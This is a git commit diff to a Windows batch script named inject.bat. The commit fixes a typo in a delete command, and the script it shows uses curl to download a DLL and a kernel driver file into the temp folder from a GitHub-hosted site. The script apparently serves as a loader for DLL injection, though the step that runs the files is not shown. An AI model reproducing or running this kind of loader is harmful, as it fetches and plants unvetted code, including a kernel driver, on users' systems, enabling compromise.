480d01e460c26bedc6b6954cc77556a5b441400a
getserver <luvwayman@gmail.com>
2024-05-29 20:47:53 +0200

    Update inject.bat

--- api/keysys/inject.bat
+++ api/keysys/inject.bat
@@ -1,7 +1,7 @@
 @echo off
 cd %temp%
 del driver.sys
-el temp.dll
+del temp.dll
 curl -o test.dll https://raw.githubusercontent.com/getserver/getserver.github.io/main/api/keysys/test.dll
 cls
 curl -o driver.sys https://getserver.github.io/api/keysys/driver.sys
